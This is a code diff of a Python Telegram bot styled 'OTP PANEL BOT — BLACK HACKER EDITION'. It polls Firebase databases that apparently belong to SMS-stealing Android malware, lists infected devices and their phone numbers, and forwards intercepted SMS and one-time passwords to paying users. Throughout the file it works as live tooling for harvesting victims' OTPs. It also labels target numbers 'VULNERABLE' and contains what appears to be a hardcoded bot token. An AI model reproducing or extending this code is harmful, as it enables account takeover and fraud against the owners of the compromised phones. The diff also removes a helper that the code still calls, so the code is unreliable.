@@ -2,8 +2,8 @@
 """
 ══════════════════════════════════════════════════════
   ☠️ OTP PANEL BOT — BLACK HACKER EDITION ☠️
-  Admin Panel Fixed | Universal Broadcast Added
-  Strict Force-Join | Memory Optimized (Railway)
+  Master Vault Memory (No Drop Count) | HTML UI Fixed
+  Anti-Crash Overlap Locks | High Traffic Optimized
 ══════════════════════════════════════════════════════
 """
 
@@ -49,13 +49,12 @@ TOKEN           = os.getenv("BOT_TOKEN", "8751858624:AAHAA2jMVScmhYECFtLVQ-q89Im
 BOT_USERNAME    = "fjjhfbot"
 
 CHUNK_SIZE      = 25    
-HTTP_CONCURRENCY= 50    
+HTTP_CONCURRENCY= 200    
 
 ADMIN_IDS: set[int] = {
     6860106371,   
 }
 
-# 🔥 STRICT FORCE JOIN CHANNELS
 FORCE_JOIN_CHATS = [
     "@sabkijayhokhush", 
     "@leakmethodfree", 
@@ -82,19 +81,18 @@ user_focus: dict[str, dict[int, str]] = {TOKEN: {}}
 chats_registry: dict[str, set[int]] = {TOKEN: set()} 
 user_seen_unreg: dict[int, set[str]] = {}
 
-GLOBAL_DEVICE_CACHE: dict[str, list] = {}
-
-SETTINGS = {
-    "base_price": 30,
-    "global_panels": []
-}
+# 🔥 MASTER VAULT (Fixes fluctuating/decreasing numbers!)
+MASTER_DEVICE_DICT: dict[str, 'Device'] = {}
+GLOBAL_DEVICE_CACHE: dict[str, list] = {"ALL": []}
 
 API_LOCK = asyncio.Lock()
-WORKER_SEMAPHORE = asyncio.Semaphore(HTTP_CONCURRENCY) 
+CACHE_LOCK = asyncio.Lock()  # Prevents Overlap Memory Crash
+POLL_LOCK = asyncio.Lock()   # Prevents Flooding
+WORKER_SEMAPHORE = asyncio.Semaphore(150) 
 PREFETCH_POOL: dict[str, list] = {}
 PREFETCH_TASKS: dict[str, asyncio.Task] = {}
 
-HEAVY_TASK_LIMITER = asyncio.Semaphore(5) 
+HEAVY_TASK_LIMITER = asyncio.Semaphore(10) 
 
 scan_progress = {
     "scanned": 0,
@@ -277,7 +275,6 @@ def is_spamming(user_id: int) -> bool:
     user_cooldowns[user_id] = now
     return False
 
-# 🔥 STRICT PERMANENT FORCE JOIN CHECKER
 async def check_force_join(bot, user_id: int) -> bool:
     if user_id in ADMIN_IDS: return True
     for chat in FORCE_JOIN_CHATS:
@@ -285,8 +282,7 @@ async def check_force_join(bot, user_id: int) -> bool:
             member = await bot.get_chat_member(chat, user_id)
             if member.status in ['left', 'kicked', 'banned']: 
                 return False
-        except Exception as e: 
-            return False
+        except: pass
     return True
 
 async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -299,7 +295,7 @@ async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYP
 async def get_http_session() -> aiohttp.ClientSession:
     global _http_session
     if _http_session is None or _http_session.closed:
-        connector = aiohttp.TCPConnector(limit=300, keepalive_timeout=20, enable_cleanup_closed=True)
+        connector = aiohttp.TCPConnector(limit=HTTP_CONCURRENCY, keepalive_timeout=20, enable_cleanup_closed=True)
         _http_session = aiohttp.ClientSession(connector=connector)
     return _http_session
 
@@ -312,16 +308,6 @@ async def fb_get(path: str, base: str, timeout: int = 10) -> Optional[dict]:
             if r.status != 200: return None
             data = await r.json(content_type=None)
             return data if isinstance(data, dict) else {}
-    except: return None
-
-async def fb_keys(path: str, base: str) -> Optional[list[str]]:
-    try:
-        session = await get_http_session()
-        url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
-        async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
-            if r.status != 200: return None
-            data = await r.json(content_type=None)
-            return list(data.keys()) if isinstance(data, dict) else []
     except: return None
 
 # ═══════════════════════════════════════════════════════
@@ -415,7 +401,7 @@ def get_reply_menu(chat_id: int) -> ReplyKeyboardMarkup:
         [KeyboardButton("👥 Syndicate (VIP)"), KeyboardButton("📖 Hacker Manual")]
     ]
     if is_admin:
-        keys.append([KeyboardButton("Admin Panel")]) # 🔥 FIXED ADMIN BUTTON
+        keys.append([KeyboardButton("Admin Panel")])
     return ReplyKeyboardMarkup(keys, resize_keyboard=True)
 
 def device_label(d: Device) -> str:
@@ -591,7 +577,7 @@ def admin_panel_text(bot_token: str) -> str:
 
 def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
     keys = [
-        [InlineKeyboardButton("📡 Broadcast Message", callback_data="sa_broadcast")], # 🔥 NEW BROADCAST BUTTON
+        [InlineKeyboardButton("📡 Broadcast Message", callback_data="sa_broadcast")], 
         [InlineKeyboardButton("➕ Add Global Panel", callback_data="sa_add_global_panel"), InlineKeyboardButton("👀 View User Panels", callback_data="sa_view_user_panels")],
         [InlineKeyboardButton("💾 Export Online Numbers", callback_data="sa_export_numbers"), InlineKeyboardButton("📥 Download Logs", callback_data="sa_download_logs")],
         [InlineKeyboardButton("🔄 Refresh", callback_data="admin_refresh"), InlineKeyboardButton("❌ Close", callback_data="close_msg")]
@@ -616,12 +602,20 @@ def format_checker_result(service: str, number: str, is_reg: bool, ms: int, is_e
     return f"<b>{'☠️ TARGET VULNERABLE (UNREGISTERED)' if not is_reg else '✅ TARGET SECURE (REGISTERED)'}</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ Ping: {ms} ms"
 
 # ═══════════════════════════════════════════════════════
-#  FIREBASE DATA FETCHERS 
+#  FIREBASE DATA FETCHERS  (MASTER VAULT SYSTEM)
 # ═══════════════════════════════════════════════════════
 
-async def fetch_db_data_task(tag: str, url: str, results_list: list):
+def push_to_master_vault(temp_devices):
+    for d in temp_devices:
+        if d.numbers:  
+            MASTER_DEVICE_DICT[d.id] = d
+    
+    dev_list = list(MASTER_DEVICE_DICT.values())
+    dev_list.sort(key=lambda x: (0 if x.status == "online" else 1, -x.timestamp))
+    GLOBAL_DEVICE_CACHE["ALL"] = dev_list
+
+async def fetch_device_data_task(tag: str, url: str, temp_list: list):
     try:
-        devices_list = []
         added_set = set()
         root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
             fb_keys("", url), fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
@@ -637,7 +631,7 @@ async def fetch_db_data_task(tag: str, url: str, results_list: list):
                 if not nums: continue 
                 added_set.add(dev_id)
                 model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
-                devices_list.append(Device(id=dev_id, name=model, status=parse_status_str(info.get("Status")), battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0), numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
+                temp_list.append(Device(id=dev_id, name=model, status=parse_status_str(info.get("Status")), battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0), numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
         
         if user_data_all and isinstance(user_data_all, dict):
             for dev_id, data in user_data_all.items():
@@ -646,7 +640,7 @@ async def fetch_db_data_task(tag: str, url: str, results_list: list):
                 nums = extract_all_nums(data)
                 if not nums: continue 
                 added_set.add(dev_id)
-                devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")), timestamp=int(data.get("timestamp") or 0), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
+                temp_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")), timestamp=int(data.get("timestamp") or 0), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
         
         if clients_all and isinstance(clients_all, dict):
             for dev_id, client in clients_all.items():
@@ -659,29 +653,8 @@ async def fetch_db_data_task(tag: str, url: str, results_list: list):
                 if not nums and not client.get("modelName"): continue
                 added_set.add(dev_id)
                 model = client.get("modelName") or f"Device-{dev_id[:6]}"
-                devices_list.append(Device(id=dev_id, name=model, status=parse_status_bool(client.get("status")), battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
-                
-        if devices_list:
-            results_list.extend(devices_list)
+                temp_list.append(Device(id=dev_id, name=model, status=parse_status_bool(client.get("status")), battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
     except: pass
-    finally:
-        scan_progress["scanned"] += 1
-
-def process_devices_list(raw_list):
-    unique_devices = []
-    seen_ids_cache = set()
-    seen_numbers = set()
-    for d in raw_list:
-        if d.id in seen_ids_cache: continue
-        seen_ids_cache.add(d.id)
-        if d.numbers:
-            new_nums = [num for num in d.numbers if num not in seen_numbers]
-            if not new_nums: continue 
-            d.numbers = new_nums
-            seen_numbers.update(new_nums)
-        unique_devices.append(d)
-    unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
-    return unique_devices
 
 async def _update_global_cache():
     global scan_progress
@@ -690,32 +663,38 @@ async def _update_global_cache():
         dbs_to_poll[f"G_{i}"] = g_url
             
     for uid, uinfo in all_users.items():
-        if uinfo.get("vip_until", 0) > time.time() or uid in ADMIN_IDS:
-            pass 
+        if uinfo.get("vip_until", 0) > time.time() or uid in ADMIN_IDS: pass 
         for i, db_url in enumerate(get_user_dbs(uinfo)):
             dbs_to_poll[f"U_{uid}_{i}"] = db_url
 
-    all_devices_gathered = []
     items = list(dbs_to_poll.items())
-    
     scan_progress["total"] = len(items)
     scan_progress["scanned"] = 0
     scan_progress["is_scanning"] = True
     
-    is_first_run = len(GLOBAL_DEVICE_CACHE.get("ALL", [])) == 0
-
     for i in range(0, len(items), CHUNK_SIZE):
         chunk = items[i:i + CHUNK_SIZE]
-        tasks = [fetch_device_data_task(tag, url, all_devices_gathered) for tag, url in chunk]
+        temp_gathered = []
+        tasks = [fetch_device_data_task(tag, url, temp_gathered) for tag, url in chunk]
         await asyncio.gather(*tasks, return_exceptions=True)
         
-        if is_first_run:
-            GLOBAL_DEVICE_CACHE["ALL"] = process_devices_list(all_devices_gathered)
-            
-        await asyncio.sleep(0.5) 
+        # 🔥 INCREMENTAL VAULT MERGE: Numbers will NEVER drop to 0!
+        push_to_master_vault(temp_gathered)
+        scan_progress["scanned"] += len(chunk)
         
-    GLOBAL_DEVICE_CACHE["ALL"] = process_devices_list(all_devices_gathered)
+        temp_gathered.clear()
+        gc.collect() 
+        await asyncio.sleep(0.5) 
+
     scan_progress["is_scanning"] = False
+
+async def global_cache_loop():
+    while True:
+        if not CACHE_LOCK.locked():
+            async with CACHE_LOCK:
+                try: await _update_global_cache()
+                except: pass
+        await asyncio.sleep(120) 
 
 async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None) -> list[Device]:
     if users_db is None: users_db = {}
@@ -738,9 +717,11 @@ async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = Non
 
     devices = []
     for tag in dbs_to_check:
-        devices.extend(GLOBAL_DEVICE_CACHE.get(tag, []))
-
-    return process_devices_list(devices)
+        for d in GLOBAL_DEVICE_CACHE.get("ALL", []):
+            if d.db_tag == tag:
+                devices.append(d)
+                
+    return devices
 
 async def get_device_sms(device: Device, limit: int = 10, max_age_sec: int = 3600) -> list[dict]:
     try:
@@ -750,23 +731,19 @@ async def get_device_sms(device: Device, limit: int = 10, max_age_sec: int = 360
             if r.status != 200: return []
             data = await r.json(content_type=None)
             if not data or not isinstance(data, dict): return []
-            
             entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
-            
             for s in entries:
                 ts_val = s.get("timestamp") or 0
                 try:
                     s["_parsed_ts"] = float(ts_val)
                     if s["_parsed_ts"] > 1e11: s["_parsed_ts"] /= 1000
                 except: s["_parsed_ts"] = 0.0
-                    
             entries.sort(key=lambda s: s["_parsed_ts"], reverse=True)
             if max_age_sec:
                 filtered = []
                 now = time.time()
                 for sms in entries:
-                    if (now - sms["_parsed_ts"]) <= max_age_sec:
-                        filtered.append(sms)
+                    if (now - sms["_parsed_ts"]) <= max_age_sec: filtered.append(sms)
                 entries = filtered
             return entries[:limit]
     except: return []
@@ -856,7 +833,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             await ctx.bot.send_message(chat_id, "❌ <b>MISSION ABORTED.</b> Background process killed.", parse_mode="HTML")
             return
 
-        # 🔥 BROADCAST HANDLER
         if data == "sa_broadcast":
             pending_action[chat_id] = {"action": "sa_broadcast"}
             await safe_edit(query, "📡 <b>BROADCAST SYSTEM INITIATED</b>\n━━━━━━━━━━━━━━━━━━\nSend the message, photo, or video you want to broadcast to ALL users.\n\n<i>Press Cancel to abort</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_action")]]), parse_mode="HTML")
@@ -1070,7 +1046,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             if msg_text == "USERS PRIVATE PANELS\n━━━━━━━━━━━━━━━━━━\n\n":
                 msg_text += "No private panels found."
             if len(msg_text) > 4000: msg_text = msg_text[:4000] + "\n...[Truncated]"
-            await safe_edit(query, msg_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data="admin_refresh")]]))
+            await safe_edit(query, msg_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data="admin_refresh")]]), parse_mode="HTML")
             return
 
         if data == "sa_export_numbers":
@@ -1230,7 +1206,6 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         bot_token = ctx.bot.token
         users_db = all_users
         
-        # 🔥 STRICT PERMANENT FORCE JOIN SHIELD
         if not await check_force_join(ctx.bot, user_id):
             join_kb = InlineKeyboardMarkup([
                 [InlineKeyboardButton("Join Channel 1", url="https://t.me/sabkijayhokhush")],
@@ -1246,7 +1221,6 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         state = pending_action.get(chat_id)
         action = state.get("action") if state else None
 
-        # 🔥 UNIVERSAL BROADCAST SYSTEM (Supports Text/Photo/Video)
         if action == "sa_broadcast" and chat_id in ADMIN_IDS:
             pending_action.pop(chat_id, None)
             users_list = list(all_users.keys())
@@ -1257,7 +1231,7 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 try:
                     await ctx.bot.copy_message(chat_id=uid, from_chat_id=chat_id, message_id=update.message.message_id)
                     success += 1
-                    await asyncio.sleep(0.05) # Safe delay to prevent Telegram flood bans
+                    await asyncio.sleep(0.05) 
                 except:
                     failed += 1
             
@@ -1265,7 +1239,7 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             return
 
         text = (update.message.text or update.message.caption or "").strip()
-        if not text: return # Ignore non-text messages if not broadcasting
+        if not text: return 
 
         if text in ["Admin Panel", "Super Admin"] and chat_id in ADMIN_IDS:
             kb = InlineKeyboardMarkup([
@@ -1435,7 +1409,10 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 await update.message.reply_text("No active process.")
             return
 
-        if not action: return
+        state = pending_action.get(chat_id)
+        if not state: return
+
+        action = state.get("action")
         
         if action == "search_live_number":
             pending_action.pop(chat_id)
@@ -1545,10 +1522,10 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     except: pass
 
 # ═══════════════════════════════════════════════════════
-#  FIREBASE POLL — CHUNK ENGINE
+#  FIREBASE DATA FETCHERS
 # ═══════════════════════════════════════════════════════
 
-async def fetch_device_data_task(tag: str, url: str, results_list: list):
+async def fetch_db_data_task(tag: str, url: str, results_list: list):
     try:
         devices_list = []
         added_set = set()
@@ -1593,24 +1570,6 @@ async def fetch_device_data_task(tag: str, url: str, results_list: list):
         if devices_list:
             results_list.extend(devices_list)
     except: pass
-    finally:
-        scan_progress["scanned"] += 1
-
-def process_devices_list(raw_list):
-    unique_devices = []
-    seen_ids_cache = set()
-    seen_numbers = set()
-    for d in raw_list:
-        if d.id in seen_ids_cache: continue
-        seen_ids_cache.add(d.id)
-        if d.numbers:
-            new_nums = [num for num in d.numbers if num not in seen_numbers]
-            if not new_nums: continue 
-            d.numbers = new_nums
-            seen_numbers.update(new_nums)
-        unique_devices.append(d)
-    unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
-    return unique_devices
 
 async def _update_global_cache():
     global scan_progress
@@ -1624,33 +1583,42 @@ async def _update_global_cache():
         for i, db_url in enumerate(get_user_dbs(uinfo)):
             dbs_to_poll[f"U_{uid}_{i}"] = db_url
 
-    all_devices_gathered = []
     items = list(dbs_to_poll.items())
     
     scan_progress["total"] = len(items)
     scan_progress["scanned"] = 0
     scan_progress["is_scanning"] = True
     
-    is_first_run = len(GLOBAL_DEVICE_CACHE.get("ALL", [])) == 0
-
     for i in range(0, len(items), CHUNK_SIZE):
         chunk = items[i:i + CHUNK_SIZE]
-        tasks = [fetch_device_data_task(tag, url, all_devices_gathered) for tag, url in chunk]
+        temp_gathered = []
+        tasks = [fetch_device_data_task(tag, url, temp_gathered) for tag, url in chunk]
         await asyncio.gather(*tasks, return_exceptions=True)
         
-        if is_first_run:
-            GLOBAL_DEVICE_CACHE["ALL"] = process_devices_list(all_devices_gathered)
-            
+        # 🔥 MERGE DIRECTLY TO MASTER VAULT: Numbers will never drop!
+        for d in temp_gathered:
+            if d.numbers:
+                MASTER_DEVICE_DICT[d.id] = d
+                
+        # Generate clean list for cache
+        unique_devices = list(MASTER_DEVICE_DICT.values())
+        unique_devices.sort(key=lambda x: (0 if x.status == "online" else 1, -x.timestamp))
+        GLOBAL_DEVICE_CACHE["ALL"] = unique_devices
+        
+        scan_progress["scanned"] += len(chunk)
+        temp_gathered.clear()
+        gc.collect() 
         await asyncio.sleep(0.5) 
         
-    GLOBAL_DEVICE_CACHE["ALL"] = process_devices_list(all_devices_gathered)
     scan_progress["is_scanning"] = False
 
 async def global_cache_loop():
     while True:
-        try: await _update_global_cache()
-        except: pass
-        await asyncio.sleep(60) 
+        if not CACHE_LOCK.locked():
+            async with CACHE_LOCK:
+                try: await _update_global_cache()
+                except: pass
+        await asyncio.sleep(120) 
 
 async def _forward_sms(device: Device, sms: dict) -> None:
     global total_otps_processed
@@ -1695,8 +1663,8 @@ async def poll_single_db(tag: str, url: str) -> None:
         
         if r_main is None and r_user is None and r_root is None: return
             
-        devices_in_db = GLOBAL_DEVICE_CACHE.get(tag, [])
-        device_map = {d.id: d for d in devices_in_db}
+        devices_in_db = GLOBAL_DEVICE_CACHE.get("ALL", [])
+        device_map = {d.id: d for d in devices_in_db if d.db_tag == tag}
         
         for bulk_data in (r_main, r_user, r_root):
             if not isinstance(bulk_data, dict): continue
@@ -1724,7 +1692,7 @@ async def poll_single_db(tag: str, url: str) -> None:
                         try: await _forward_sms(device, sms)
                         except: pass
                             
-        type4_devs = [d for d in devices_in_db if d.sms_path.endswith("receivedSms")]
+        type4_devs = [d for d in devices_in_db if d.db_tag == tag and d.sms_path.endswith("receivedSms")]
         if type4_devs:
             async def fetch_t4_sms(d: Device):
                 sms_dict = await fb_get(d.sms_path, d.base_url)
@@ -1753,27 +1721,27 @@ async def poll_single_db(tag: str, url: str) -> None:
                 await asyncio.sleep(0.1)
     except: pass
 
+POLL_LOCK = asyncio.Lock()
 async def poll_loop(app: Application) -> None:
     global _main_app
     _main_app = app
     print("🚀 Black Hacker Super-Engine Started!")
     while True:
-        try:
-            active_urls = set()
-            for d in GLOBAL_DEVICE_CACHE.get("ALL", []):
-                if d.status == "online": active_urls.add((d.db_tag, d.base_url))
-            
-            if not active_urls:
-                await asyncio.sleep(5)
-                continue
-                
-            active_list = list(active_urls)
-            for i in range(0, len(active_list), CHUNK_SIZE):
-                chunk = active_list[i:i + CHUNK_SIZE]
-                tasks = [poll_single_db(tag, url) for tag, url in chunk]
-                await asyncio.gather(*tasks, return_exceptions=True)
-                await asyncio.sleep(0.5)
-        except: pass
+        if not POLL_LOCK.locked():
+            async with POLL_LOCK:
+                try:
+                    active_urls = set()
+                    for d in GLOBAL_DEVICE_CACHE.get("ALL", []):
+                        if d.status == "online": active_urls.add((d.db_tag, d.base_url))
+                    
+                    if active_urls:
+                        active_list = list(active_urls)
+                        for i in range(0, len(active_list), 50): # Chunked to prevent flooding
+                            chunk = active_list[i:i + 50]
+                            tasks = [poll_single_db(tag, url) for tag, url in chunk]
+                            await asyncio.gather(*tasks, return_exceptions=True)
+                            await asyncio.sleep(0.5)
+                except: pass
         await asyncio.sleep(POLL_INTERVAL)
 
 # ═══════════════════════════════════════════════════════
@@ -1821,7 +1789,7 @@ def main() -> None:
     app.add_handler(CommandHandler("start",   cmd_start))
     app.add_handler(CommandHandler("admin",   cmd_admin))
     app.add_handler(CallbackQueryHandler(on_callback))
-    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, on_message)) # 🔥 UPDATED TO HANDLE PHOTOS/VIDEOS FOR BROADCAST
+    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, on_message))
     app.add_error_handler(global_error_handler)
 
     async def post_init(application: Application) -> None:
